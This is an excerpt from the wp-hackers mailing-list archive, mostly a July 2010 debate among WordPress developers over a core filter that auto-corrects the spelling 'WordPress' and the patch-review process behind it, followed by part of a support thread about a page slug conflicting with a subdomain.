	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<201007061552.39703.chip@chipbennett.net>
Message-ID: <424539890.121525.1278452961263.JavaMail.open-xchange@oxusltgw10.schlund.de>

Chip,
?
Forgive me if it came across as if I was addressing you specifically. ?You
weren't the first to take that tone with your post, it just happened I was
engaged in an off-email debate at the time your message came through so it was
the one that I responded to.
?
There have been more than a few snarky comments in this thread, and more than a
few of those have been directed specifically at Matt ... that's what I was
responding to. ?Yes, he wrote the patch and yes, he's been the most vocal
defender of it. ?But keep in mind he's not the only person responsible for the
patch making its way into core (Nacin committed the patch, and at least one
other core dev has commented in this thread already). ?The overall tone of
things feels like it's taken an anti-Matt turn rather than an
anti-this-specific-patch tone. ?That's not OK, and that's what I was responding
to.
?
But yes, your point is valid. ?If plug-in popularity is the metric against which
patch suitability is measured, then this patch fails in all regards. ?There are
hundreds of more popular plug-ins in the repository, and most (if not all) of
them have little to no chance of making it in to core. ?But to argue for plug-in
popularity as the rule against which we measure for either inclusion or
exclusion is to pass the buck and bow out of the discussion. ?Keep in mind that
many people are unable to run plug-ins either due to their hosting environment,
server setup, or sheer inability to implement the new systems. ?Using download
rates as a way to measure relative "success" of one patch or another is IMO an
inherently flawed idea.
?
?
But again, forgive me if I came across as targeting your remarks in particular.
?That wasn't my intent at all.
?
~Eric
?

On July 6, 2010 at 8:52 PM Chip Bennett <chip at chipbennett.net> wrote:

> While I admit that I might have added unnecessary snark into that reply* (and
> apologize for doing so), is the point invalid?
>
> I wasn't the one to bring up the issue of popularity of a plugin as
> justification for decisions regarding core code; I believe Matt brought that
> up (in reference to determining whether to consider removing the filter from
> core, based on popularity of a plugin to remove the filter).
>
> But, a plugin to *add* the filter has existed in the repository for three
> years, and has been woefully unpopular - it has generated only 334 downloads.
>
> So, does that mean that if a plugin to remove the now-core filter exceeds the
> popularity of the extant plugin to add that filter, that the core filter will
> be removed, and left as plugin material?
>
> Or should this really be left to a plugin popularity contest to begin with? I
> would suggest that the relative lack of popularity of Ozh' plugin is prima
> facie evidence that the functionality should never have been considered as
> core material in the first place.
>
> * p.s. Snark: yes. Personal attacks: no. You'll find the former in my reply,
> but not the latter.
>
> --
> Chip Bennett
> chip at chipbennett.net
> www.chipbennett.net
>
> On Tuesday 06 July 2010 3:12:49 pm eric at eamann.com wrote:
> > Unfortunately, this is where the conversation begins to derail.? Let's try
> > not to make it a personal issue.? We're facing three core problems here
> > (that I've seen at least):
> >?
> > 1) WordPress has added a feature that modifies post content without input
> > or oversight from end users, many of whom are not technically skilled
> > enough to program or install a work-around.? This is a question of
> > perceived censorship because the platform is now actively changing the
> > words you originally wrote without your permission. (Philosophically I see
> > this as a large issue.)
> > 2) Performance issues: Adding another filter slows down the processing
> > engine. (In the short term this seems to be a minor issue.)
> >?
> > 3) Standards and consistency: For a community member to submit code to
> > core, they must create a Trac ticket, submit a patch for discussion,
> > possible tap a core developer for feedback on IRC, and wait for several
> > rounds of feedback before it can be added (I'm talking feature additions,
> > not bug fixes).? In this case, though, a core developer submitted a change
> > to core code without the same levels of discussion.? (This presents a much
> > larger issue.)
> >?
> > WordPress is a community project.? It's used by the community, supported by
> > the community, and (allegedly) developed by the community.? When the
> > community is required to submit to multiple layers of review, allowing
> > core developers to circumvent that system creates an environment of
> > animosity (just read back through this thread if you don't believe that).
> >? We begin attacking one another on a personal level rather than opening
> > discussing the issues and trying to build a stronger community.
> >?
> > The fact of the matter is that this filter is a somewhat trivial issue.
> >? Did it break a few sites?? Yes, but any problems can be quickly fixed by
> > a competent developer and many of us are willing to help community members
> > overcome problems like this for free.? Any upgrade can break a site, so
> > this isn't a big surprise.
> >?
> > But did this patch follow the set standards for patch submission? ( see
> > http://codex.wordpress.org/User:HEngel/How_To_Become_A_WordPress_Developer
> > or http://codex.wordpress.org/Development_Planning)? No.? That's where I
> > have the biggest complaint.
> >?
> > The most resounding issue, though, is the lack of openness in discussions
> > here on the mailing list.? It doesn't matter who you are or how you're
> > affiliated with the WordPress project, you can have an opinion.? Further
> > more, that opinion can be wrong.? That's what makes working on a project
> > like this productive - you voice your opinion, discuss it with the
> > community, and come to a conclusion about the best way forward.? Your
> > initial idea may or may not be the final conclusion.
> >?
> > To forego this discussion before committing code, though, threatens to
> > destroy the process.? Community members who thought themselves your equal
> > now feel left at the side of the road.? Dismissing concerns out-of-hand
> > only reinforces this feeling and causes a minor issue (the entire patch
> > was ~5 lines of code!) to escalate to an emotional, major one (we've been
> > debating this for how long?).
> > When new developers want to add a new feature to core, they're encouraged
> > to first build a plug-in and to see how popular it is with other users.
> >? If it's a major improvement, someone will suggest it be added to core.
> >? In the case of this particular patch, I can't see many people installing
> > a plug-in to add just this feature.? Still, engaging the community
> > *before* adding the patch would still let everyone know about the feature
> > and gauge its popularity.
> > Had we polled even just this list before, I have no doubt many of us would
> > have jumped on board.? We didn't, and it's time to learn from that slight
> > oversight and move forward.
> >?
> > What non-core devs are seeing is a unilateral modification of code by core
> > devs without the approval process those same core devs require from the
> > community. It has us up-in-arms about the patch, and struggling to grasp
> > at an amicable solution.
> >?
> > I'd like to suggest that we take a minute to cool down and think about
> > what's really at issue here.? Are we upset about a patch?? Are we upset
> > about an inconsistent commit process?? Are we upset about the dichotomy
> > between core and non-core developers?? Then, without insulting one
> > another, injecting snide remarks, or claiming that people can "vote with
> > their feet" and leave a project they love because of a ~5-line patch,
> > let's figure out what we can learn through this process and how we can
> > avoid such a massive public backlash in the future.
> > For what it's worth, I'd like to see:
> > - This filter turned off (I'd rather write a plug-in to *add* a filter than
> > *remove* one)
> > - A clear, concise list of what steps *everyone* must follow when
> > submitting a patch to core
> >?
> > I don't know about everyone else, but I'd be more than happy with either or
> > both of those ...
> >?
> > ~Eric
> >?
> >
> > On July 6, 2010 at 7:40 PM Chip Bennett <chip at chipbennett.net> wrote:
> > > Oh, silly me!
> > >
> > > There already *is* such a plugin. It's been in the repository for almost
> > > three years:
> > >
> > > http://wordpress.org/extend/plugins/ozhs-correctly-spell-wordpress/
> > >
> > > It has a grand total of (wait for it...)
> > >
> > > *334 downloads*
> > >
> > > So, Matt, tell us again: just how vital and popular is this core change?
> > >
> > > --
> > > Chip Bennett
> > > chip at chipbennett.net
> > > www.chipbennett.net
> > >
> > > On Tuesday 06 July 2010 1:34:09 pm Gavin Pearce wrote:
> > > > +1 :)
> > > >
> > > > -----Original Message-----
> > > > From: wp-hackers-bounces at lists.automattic.com
> > > > [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Chip
> > > > Bennett
> > > > Sent: 06 July 2010 19:29
> > > > To: wp-hackers at lists.automattic.com
> > > > Subject: Re: [wp-hackers] Putting the P in WordPress
> > > >
> > > > How about moving the entire function itself into a plugin, and see how
> > > > many
> > > > downloads *it* gets?
> > > >
> > > > > On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
> > > > > > I wrote a patch weeks ago to take it out. I'm really not trying to
> > > >
> > > > be
> > > >
> > > > > > difficult! I just think this filter is a terrible idea. And it's a
> > > > > > little sad to witness the total lack of interest from the core
> > > > > > team. This isn't how it's supposed to work, IMO.
> > > > >
> > > > > Maybe write and promote a plugin, and we can see how many downloads
> > > > > it gets?
> > > >
> > > > _______________________________________________
> > > > wp-hackers mailing list
> > > > wp-hackers at lists.automattic.com
> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > > _______________________________________________
> > > > wp-hackers mailing list
> > > > wp-hackers at lists.automattic.com
> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wphackers at jakemgold.myfastmail.com  Tue Jul  6 21:58:21 2010
From: wphackers at jakemgold.myfastmail.com (Jake Goldman)
Date: Tue, 06 Jul 2010 17:58:21 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>	<4C333B03.8010603@rotorised.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com>
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
Message-ID: <4C33A6FD.1020500@jakemgold.myfastmail.com>

  Just to be clear, the specific issue of using "Wordpress" in a path or 
image name /has/ been addressed in a patch (I think by Mark Jaquith) for 
3.0.1.

That's an overt "bug" that can break things. The philosophical debate 
about the very inclusion of this filter is fascinating, but also strikes 
me as "water under the bridge", particularly on a "hackers" thread.

As to the question of "bloat", one could also argue that constantly 
checking a "fix Wordpress" option setting before applying a simple 
filter is also adding bloat.

Jake

On 7/6/2010 1:30 PM, eric at eamann.com wrote:
> To be honest, the P function didn't completely break my blog.  However, it did
> mess with several images on my site.  Years ago, when I first started with
> WordPress, I used the "one-click installer" my web host provided.  It set my
> directory as www.mydomain.com/Wordpress ... so every image I uploaded in the 2
> years I was there was stored as www.mydomain.com/Wordpress/wp-content/...  I've
> gone back through and changed them (it was a bad naming schema to begin with),
> but that's not really the point.  The point is that we have an inconsistent
> development process:
>   
> - A trivial feature built by a member of the community-at-large is identified as
> such and rejected.
> - A trivial feature built by a core team member is included and requests to
> remove the feature are dismissed by the core developers.

From m at mullenweg.com  Tue Jul  6 22:13:44 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:13:44 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com> <4C333B03.8010603@rotorised.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>	<4C336A55.6080803@mullenweg.com>
	<AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>
Message-ID: <4C33AA98.7030008@mullenweg.com>

On 7/6/2010 2:14 PM, Christopher O'Connell wrote:
> But, Matt, the difference between disagreement and disregard is that when
> one disagrees one still takes a moment to consider the pros- and cons- of
> ones argument.

What makes you think I haven't? Why do you attribute everything you 
disagree with in WordPress to me, personally?

> WordPress is meant to be a community, and the reason this has people red
> with rage, writing, instead of hacking, is because they are rightly filled
> with disgust and horror at such low action.

I'm a little worried anyone has red rage -- it sounds hazardous for your 
health.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 22:14:24 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:14:24 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061329.26694.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com>
	<201007061329.26694.chip@chipbennett.net>
Message-ID: <4C33AAC0.1080702@mullenweg.com>

On 7/6/2010 2:29 PM, Chip Bennett wrote:
> How about moving the entire function itself into a plugin, and see how many
> downloads*it*  gets?

Because it doesn't do any harm, and is the sort of thing that's best 
when it's invisible. (Like all of the other features I referred to.)

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 22:16:06 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:16:06 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FC6@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca><AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com><AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>
	<4C333B03.8010603@rotorised.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com>	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de><4C336A55.6080803@mullenweg.com>	<AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC6@tbs-sbs01.TBS.local>
Message-ID: <4C33AB26.5070101@mullenweg.com>

On 7/6/2010 2:32 PM, Gavin Pearce wrote:
> Core code starts to affect the textual output of blogs.

We have always done this through display filters. The data is still 
exactly as entered in the database so the filters are non-permanent and 
non-destructive.

> Core code breaks URI paths for some sites (major issue).

This is an orthogonal issue, and one addressed pretty elegantly in 
Mark's patch.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 22:17:28 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:17:28 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <6C02E437-EC3B-47A3-A222-1136BD8FCCA5@thisismyurl.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>	<4C333B03.8010603@rotorised.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com>	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>	<4C336A55.6080803@mullenweg.com>
	<6C02E437-EC3B-47A3-A222-1136BD8FCCA5@thisismyurl.com>
Message-ID: <4C33AB78.8070309@mullenweg.com>

On 7/6/2010 2:33 PM, Christopher Ross wrote:
> Matt, I wish I could say I felt there was any respect for the community here but there hasn't been a discussion, it's a dictation from you to the rest of the world which states you have the right to edit websites without regard for editorial respect.

There was a discussion, about six weeks ago when the code was first 
checked in and before the release of 3.0. (About 3.5 million downloads ago.)

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 22:26:23 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:26:23 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061342.40892.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>	<4C336A55.6080803@mullenweg.com>
	<201007061342.40892.chip@chipbennett.net>
Message-ID: <4C33AD8F.9060306@mullenweg.com>

On 7/6/2010 2:42 PM, Chip Bennett wrote:
> I believe that the issue here involves equally the underlying impropriety of
> the filter and your perceived attitude toward those who are asking for the
> filter's removal.

I'm sorry if my words did not convey my understanding and empathy for 
people who are against the filter -- email is not great at that -- but I 
having read every message in this thread I think I have a pretty good 
grasp of it.

> By imposing on end users your purpose - regardless of how noble - of
> correctly spelling "WordPress" you are violating the very freedoms you
> espouse.

That statement is hard for me to accept because the freedoms provided by 
the GPL are completely intact and, to me, sacred. I have spent the 
majority of my adult life spreading them to millions of people and I 
feel to compare this trivial issue to removing them should invoke some 
form of Godwin's law, and I will not respond to any more messages along 
that thread.

> This function should have been written as a plugin from the very beginning.
> Bundle it with core if you must (surely it is - at a minimum - more useful
> than Hello Dolly, after all).

I think you also fundamentally misunderstand the point of Hello Dolly.

> As for me: what concerns me most is the "slippery slope" consideration of the
> core development team's response to community outcry regarding this function
> being added to core.

One of the hardest things about developing software for an audience as 
large as WordPress' is maintaining a balance between community feedback 
(where community > 1% of users) and developer feedback (this list, the 
~1,200 active people on Trac).

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 22:27:49 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:27:49 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <3e131826-79ac-478c-a235-0dfa254af480@d37g2000yqm.googlegroups.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
	<201007061329.26694.chip@chipbennett.net>	<AANLkTileYyT_FWnzaBkLBOAmeXL5HEcWiUwn_RWY6Y6R@mail.gmail.com>
	<3e131826-79ac-478c-a235-0dfa254af480@d37g2000yqm.googlegroups.com>
Message-ID: <4C33ADE5.8050409@mullenweg.com>

On 7/6/2010 2:51 PM, 24/7 wrote:
> Possible Q#1: How many downloads would such a plugin need?

I'm not sure, more than 10,000 for sure and closer to 50k to be serious.

> Possible Q#2: When does an idea get's accepted as a possible
> alternative?

I'm not sure what this sentence means.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 22:29:58 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:29:58 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTind_Lj1956JS2mD3ua2Y-zcczoItX6LrhhJ5Z9M@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<201007061329.26694.chip@chipbennett.net>	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>	<201007061440.59637.chip@chipbennett.net>	<AANLkTikieGPSjp0OdED0K6v2b5I1ynqGMhD4teng8nG6@mail.gmail.com>
	<AANLkTind_Lj1956JS2mD3ua2Y-zcczoItX6LrhhJ5Z9M@mail.gmail.com>
Message-ID: <4C33AE66.3080409@mullenweg.com>

On 7/6/2010 3:54 PM, Mitch Canter wrote:
> +1 for the emoticons - that's a very good way to look at it.
>
> 1) both are cosmetic
> 2) both do alter the content in some reasonable fashion
> 3) one has an option - why shouldn't the other?

Emoticons have a option for two reasons:

* They're slightly buggy, try a sentence like "Thirty-eight (38) downloads."

We should fix that.

* It's inherited from the b2 days.

I think it might be worth removing the option for emoticons and also 
making them plugin opt-out, but ideally I'd like to see some usage data 
for the option first.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From ravi-lists at g8o.net  Tue Jul  6 22:36:01 2010
From: ravi-lists at g8o.net ( ravi )
Date: Tue, 6 Jul 2010 18:36:01 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <424539890.121525.1278452961263.JavaMail.open-xchange@oxusltgw10.schlund.de>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061440.59637.chip@chipbennett.net>
	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<201007061552.39703.chip@chipbennett.net>
	<424539890.121525.1278452961263.JavaMail.open-xchange@oxusltgw10.schlund.de>
Message-ID: <63D48433-7F51-4665-88B1-1A5347166F9D@g8o.net>

On Jul 6, 2010, at 5:49 PM, eric at eamann.com wrote:
>  The overall tone of
> things feels like it's taken an anti-Matt turn rather than an
> anti-this-specific-patch tone.


Time to register antimattic.com and move this debate there? ;-)

	?ravi


P.S: before you complain, consider that I had an even lamer pun in mind, based on the word play ?anti-matter?. I deserve plaudits for choosing the higher road!


From mitch at studionashvegas.com  Tue Jul  6 22:37:35 2010
From: mitch at studionashvegas.com (Mitch Canter)
Date: Tue, 6 Jul 2010 17:37:35 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C33AE66.3080409@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<AANLkTikieGPSjp0OdED0K6v2b5I1ynqGMhD4teng8nG6@mail.gmail.com>
	<AANLkTind_Lj1956JS2mD3ua2Y-zcczoItX6LrhhJ5Z9M@mail.gmail.com>
	<4C33AE66.3080409@mullenweg.com>
Message-ID: <AANLkTilAgVsWhO5BmA_3Ih-IZitkGXhgB-O3rHMK7-iU@mail.gmail.com>

Just out of curiosity, what value would having a plugin to opt out (in
either case) vs. an option in the menu give.  I would think that the
server load the option generation would cause would be negligible, yet
the latter being more user-friendly to someone not schooled in the art
of / having no access to plugins.

Mitch
http://www.mitchcanter.com
http://www.studionashvegas.com

On Tue, Jul 6, 2010 at 5:29 PM, Matt Mullenweg <m at mullenweg.com> wrote:
> On 7/6/2010 3:54 PM, Mitch Canter wrote:
>>
>> +1 for the emoticons - that's a very good way to look at it.
>>
>> 1) both are cosmetic
>> 2) both do alter the content in some reasonable fashion
>> 3) one has an option - why shouldn't the other?
>
> Emoticons have a option for two reasons:
>
> * They're slightly buggy, try a sentence like "Thirty-eight (38) downloads."
>
> We should fix that.
>
> * It's inherited from the b2 days.
>
> I think it might be worth removing the option for emoticons and also making
> them plugin opt-out, but ideally I'd like to see some usage data for the
> option first.
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From m at mullenweg.com  Tue Jul  6 22:38:50 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:38:50 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <424539890.121525.1278452961263.JavaMail.open-xchange@oxusltgw10.schlund.de>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<201007061440.59637.chip@chipbennett.net>	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>	<201007061552.39703.chip@chipbennett.net>
	<424539890.121525.1278452961263.JavaMail.open-xchange@oxusltgw10.schlund.de>
Message-ID: <4C33B07A.5010203@mullenweg.com>

On 7/6/2010 5:49 PM, eric at eamann.com wrote:
>   If plug-in popularity is the metric against which
> patch suitability is measured, then this patch fails in all regards.

I didn't mean to suggest that should be the sole method of adding 
functionality to WordPress or that every line of code should be a plugin 
first.

I meant it specifically as an outlet for people suggesting "the 
community is against this" or that the "majority" of people are in a 
"red rage" or other similar sentiments.

Since we've previously established why mailing list activity, or even 
vocal opposition, is not a good metric for determining the ultimate 
success of anything added to WordPress (or we wouldn't have themes or 
WYSIWYG) a plugin could provide data as to the breadth and depth of 
opposition in a manner more useful than a mailing list.

To reiterate, I do not believe every feature in WordPress should be a 
plugin first, even though often plugins provide excellent inspiration 
and indicators about what direction core WP should head in.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Jul  6 22:50:03 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 06 Jul 2010 18:50:03 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTilAgVsWhO5BmA_3Ih-IZitkGXhgB-O3rHMK7-iU@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<201007061329.26694.chip@chipbennett.net>	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>	<201007061440.59637.chip@chipbennett.net>	<AANLkTikieGPSjp0OdED0K6v2b5I1ynqGMhD4teng8nG6@mail.gmail.com>	<AANLkTind_Lj1956JS2mD3ua2Y-zcczoItX6LrhhJ5Z9M@mail.gmail.com>	<4C33AE66.3080409@mullenweg.com>
	<AANLkTilAgVsWhO5BmA_3Ih-IZitkGXhgB-O3rHMK7-iU@mail.gmail.com>
Message-ID: <4C33B31B.3040009@mullenweg.com>

On 7/6/2010 6:37 PM, Mitch Canter wrote:
> Just out of curiosity, what value would having a plugin to opt out (in
> either case) vs. an option in the menu give.  I would think that the
> server load the option generation would cause would be negligible, yet
> the latter being more user-friendly to someone not schooled in the art
> of / having no access to plugins.

The core philosophy of WordPress is fairly anti-option. In Open Source 
software, in particular, arguments can get so heated and personal that 
in an effort to put out the fire many projects solve disagreements with 
options.

While this may stop the argument, it does so at the expense of the user. 
(And ultimately the software.) It puts a cognitive load on the user to 
make a decision about something every time they visit or update that 
screen, the more esoteric or trivial the option, the more likely it is 
to confuse and confound everyone who comes across it.

For a nightmare-inducing example of what happens when project leadership 
does not guard against this, study this screen from OpenOffice.org and 
realize there are 42 others just like it or worse in user-visible 
options panel:

http://matt.files.wordpress.com/2010/07/open-office.png

(42? Can't be a coincidence. :))

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From elizabeth at slatetechpdx.com  Tue Jul  6 22:59:59 2010
From: elizabeth at slatetechpdx.com (Elizabeth Buckwalter)
Date: Tue, 6 Jul 2010 15:59:59 -0700
Subject: [wp-hackers] Home redirects to new page on WP 3.0
Message-ID: <AANLkTim-FmU09UFqRkPSGx_H70JGbznJkQ7dn07Z3tcT@mail.gmail.com>

On Tue, Jul 6, 2010 at 1:13 PM,
<wp-hackers-request at lists.automattic.com> wrote:

> Message: 1
> Date: Tue, 6 Jul 2010 15:24:08 -0400
> From: mccormicky <mccormicky at gmail.com>
> Subject: Re: [wp-hackers] Home redirects to new page on WP 3.0
> To: wp-hackers at lists.automattic.com
> Message-ID:
> ? ? ? ?<AANLkTikCQGsRV-bltw6tuolLq6pREtZogCErERXXYFtv at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
> Oh whatever. They can talk about P for 4 days but someone can't help someone
> else.
> It isn't WordPress and it is not a bug.
> You're confusing your server.
>
> Page Title: Experience Tuscany
> Page Slug: ?experience-tuscany
> Domain: thriftytuscany.com
> Sub-Domain: experience-tuscany
> URL: http://experience-tuscany.thriftytuscany.com/experience-tuscany
>
> If you make the slug different than experience-tuscany you won't get a 404

So, what you're saying is that you can't have a page slug that is the
same as a subdomain? Is there any documentation on this?  Is there
someplace that says, don't name your pages the same as your subdomain?
 If this is so, this sounds like an issue that needs to be addressed
with either documentation or a fix.

>
> On Tue, Jul 6, 2010 at 2:13 PM, Michael D Adams <mda at blogwaffe.com> wrote:
>
>> On Tue, Jul 6, 2010 at 9:27 AM, mailapera <mailapera at gmail.com> wrote:
>> > I installed 3.0 and after creating a new page, additional to those I
>> > already had prior to the upgrade to 3.0, my homepage redirects to that
>> > newly created page with a 301 permanent redirect. If I delete the page
>> > the redirect stays and produces a 404 error each time I try to visit
>> > the homepage. To eliminate the error I have to go in the DB and delete
>> > the 301 entry.
>>
>> This list is not a support list.

You shouldn't jump to a conclusion such as this when WP 3.0 has just
come out.  It *could* be a bug.

>> You have a problem with Redirects. ?Do you have any redirection
